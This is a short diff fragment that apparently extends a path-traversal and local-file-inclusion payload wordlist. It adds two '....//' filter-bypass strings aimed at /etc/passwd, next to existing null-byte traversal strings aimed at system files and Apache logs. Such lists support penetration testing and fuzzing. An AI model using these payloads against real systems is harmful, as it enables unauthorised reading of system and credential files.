@@ -10,6 +10,8 @@
 /etc/knockd%00
 ../../../../../../../../../../etc/passwd%00
 /etc/passwd%00
+....//....//....//etc//passwd
+....//....//....//....//....//....//....//....//....//....//....//etc//passwd%00
 ../../../../../../../../../../apache2/logs/access.log
 ../../../../../../../../../../apache2/logs/access
 /apache2/logs/access.log
